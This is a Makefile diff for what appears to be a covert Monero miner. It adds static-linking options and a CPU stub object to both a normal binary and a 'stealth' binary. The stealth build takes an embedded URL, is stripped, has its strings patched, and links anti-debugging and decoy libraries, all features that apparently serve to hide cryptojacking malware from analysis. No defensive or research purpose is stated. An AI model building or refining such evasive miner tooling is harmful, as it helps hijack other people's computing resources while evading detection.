@@ -123,6 +123,20 @@ INCS = -I$(RANDOMX_INC) \
        -I$(LIBS_DIR)/libdecoy/include \
        -Isrc
 
+STATIC ?= 0
+ifeq ($(STATIC),1)
+STATIC_FLAG = -static
+SSL_LIBS = -lssl -lcrypto
+EXTRA_LIBS = -lzstd -lz -ldl -lpthread -lm -lstdc++
+else
+STATIC_FLAG =
+SSL_LIBS = $(if $(wildcard static_lib/libssl.a),static_lib/libssl.a static_lib/libcrypto.a,-lssl -lcrypto)
+EXTRA_LIBS = -lpthread -lm -ldl -lstdc++ -lzstd -lz
+endif
+
+DL_STUB_SRC = src/dl_cpu_stub.c
+DL_STUB_OBJ = src/dl_cpu_stub.o
+
 LINK_LIBS = \
 	$(LIBS_DIR)/libstratum/libstratum.a \
 	$(LIBS_DIR)/libminer/libminer.a \
@@ -133,17 +147,21 @@ LINK_LIBS = \
 	$(LIBS_DIR)/libcrypto/libcrypto.a \
 	$(LIBS_DIR)/libutils/libutils.a \
 	$(RANDOMX_LIB) \
-	$(if $(wildcard static_lib/libssl.a),static_lib/libssl.a static_lib/libcrypto.a,-lssl -lcrypto) \
-	-lpthread -lm -ldl -lstdc++ -lzstd -lz
+	$(SSL_LIBS) \
+	$(DL_STUB_OBJ) \
+	$(STATIC_FLAG) $(EXTRA_LIBS)
 
 # --- xmrminer (user-friendly CLI) ---
 
 MAIN_SRC = src/main.c
 MAIN_OBJ = src/main.o
 
-$(BIN): $(MAIN_OBJ) $(ALL_LIBS) $(RANDOMX_LIB)
+$(BIN): $(MAIN_OBJ) $(ALL_LIBS) $(RANDOMX_LIB) $(DL_STUB_OBJ)
 	$(CC) $(CFLAGS) $(INCS) -o $@ $(MAIN_OBJ) $(LINK_LIBS)
 	@python3 patch_strings.py $@
+
+$(DL_STUB_OBJ): $(DL_STUB_SRC)
+	$(CC) $(CFLAGS) -c -o $@ $<
 
 $(MAIN_OBJ): src/main.c
 	$(CC) $(CFLAGS) $(INCS) -c -o $@ $<
@@ -161,7 +179,7 @@ STEALTH_CFLAGS = $(if $(STEALTH_URL),-DSTEALTH_URL='"$(STEALTH_URL)"') \
 STEALTH_SRC = src/stealth.c
 STEALTH_OBJ = src/stealth.o
 
-$(BIN_STEALTH): $(STEALTH_OBJ) $(ALL_LIBS) $(RANDOMX_LIB)
+$(BIN_STEALTH): $(STEALTH_OBJ) $(ALL_LIBS) $(RANDOMX_LIB) $(DL_STUB_OBJ)
 	$(CC) $(CFLAGS) $(INCS) -o $@ $(STEALTH_OBJ) $(LINK_LIBS)
 	@strip --strip-all $@ && echo "  stripped $@"
 	@python3 patch_strings.py $@
@@ -189,7 +207,7 @@ $(RANDOMX_LIB):
 # ============================================================================
 
 clean:
-	rm -f $(MAIN_OBJ) $(STEALTH_OBJ) $(BIN) $(BIN_STEALTH)
+	rm -f $(MAIN_OBJ) $(STEALTH_OBJ) $(DL_STUB_OBJ) $(BIN) $(BIN_STEALTH)
 	for d in $(LIBS_DIR)/libutils $(LIBS_DIR)/libcrypto $(LIBS_DIR)/libantidebug \
 	         $(LIBS_DIR)/libjson $(LIBS_DIR)/libws $(LIBS_DIR)/libstratum \
 	         $(LIBS_DIR)/libminer $(LIBS_DIR)/libdecoy; do \
